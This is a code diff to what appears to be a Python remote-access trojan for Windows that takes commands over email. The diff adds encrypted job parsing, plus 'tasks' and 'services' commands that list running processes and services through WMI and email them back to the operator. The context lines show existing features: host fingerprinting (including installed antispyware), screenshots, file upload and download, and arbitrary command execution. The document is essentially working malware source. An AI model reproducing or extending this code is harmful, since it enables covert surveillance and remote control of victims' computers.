@@ -48,6 +48,7 @@ import getpass
 import uuid
 import netifaces
 import urllib2
+import pythoncom
 
 from win32com.client import GetObject
 from enum import Enum
@@ -201,7 +202,7 @@ class SystemInfo:
         for i in objWMI:
             self.Antispyware.append(i.displayName.strip())
         self.Geolocation = getGeolocation()
-        
+    
         self.UniqueID = hashlib.sha256(
                            self.Architecture + 
                            self.WinVer + 
@@ -460,7 +461,7 @@ class MessageParser:
         for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
             if payload.get_content_maintype() == 'text':
                 self.text = payload.get_payload()
-                self.dict = json.loads(payload.get_payload())
+                self.dict = json.loads(infoSec.Decrypt(payload.get_payload()))
 
             elif payload.get_content_maintype() == 'application':
                 self.attachment = payload.get_payload()
@@ -554,6 +555,52 @@ class download(threading.Thread):
             sendEmail({'cmd': 'download', 'res': 'Failed: {}'.format(e)}, self.jobid)
 
 
+class tasks(threading.Thread):
+
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.daemon = True
+        self.start()
+
+    def _detectRunningProcesses(self):
+        pythoncom.CoInitialize()
+        procs = []
+        w = wmi.WMI ()
+        for process in w.Win32_Process ():
+            procs.append('{0};{1}'.format(process.ProcessId, process.Name))
+        return procs
+    
+    def run(self):
+        try:
+            sendEmail({'cmd': 'tasks', 'res': self._detectRunningProcesses()}, self.jobid)
+        except Exception as e:
+            sendEmail({'cmd': 'tasks', 'res': 'Failed: {}'.format(e)}, self.jobid)
+            
+
+class services(threading.Thread):
+
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.daemon = True
+        self.start()
+
+    def _detectServices(self):
+        pythoncom.CoInitialize()
+        srvs = []
+        w = wmi.WMI ()
+        for service in w.Win32_Service ():
+            srvs.append('{0};{1}'.format(service.Name, str(service.StartMode)))
+        return srvs
+    
+    def run(self):
+        try:
+            sendEmail({'cmd': 'services', 'res': self._detectServices()}, self.jobid)
+        except Exception as e:
+            sendEmail({'cmd': 'services', 'res': 'Failed: {}'.format(e)}, self.jobid)
+            
+                 
 class upload(threading.Thread):
 
     def __init__(self, jobid, dest, attachment):
@@ -653,7 +700,7 @@ class execCmd(threading.Thread):
 def genRandomString(slen=10):
     return ''.join(random.sample(string.ascii_letters + string.digits, slen))
 
-
+  
 def detectForgroundWindows():
     #Stolen fom https://sjohannes.wordpress.com/2012/03/23/win32-python-getting-all-window-titles/
     EnumWindows = ctypes.windll.user32.EnumWindows
@@ -674,6 +721,7 @@ def detectForgroundWindows():
     EnumWindows(EnumWindowsProc(foreach_window), 0)
      
     return titles
+
 
 class sendEmail(threading.Thread):
 
@@ -765,7 +813,7 @@ def checkJobs():
                 msg_data = c.uid('fetch', msg_id, '(RFC822)')
                 msg = MessageParser(msg_data)
                 jobid = msg.subject.split(':')[2]
-                
+            
                 if msg.dict:
                     cmd = msg.dict['cmd'].lower()
                     arg = msg.dict['arg']
@@ -783,6 +831,12 @@ def checkJobs():
 
                     elif cmd == 'screenshot':
                         screenshot(jobid)
+                        
+                    elif cmd == 'tasks':
+                        tasks(jobid)
+                        
+                    elif cmd == 'services':
+                        services(jobid)
 
                     elif cmd == 'cmd':
                         execCmd(arg, jobid)
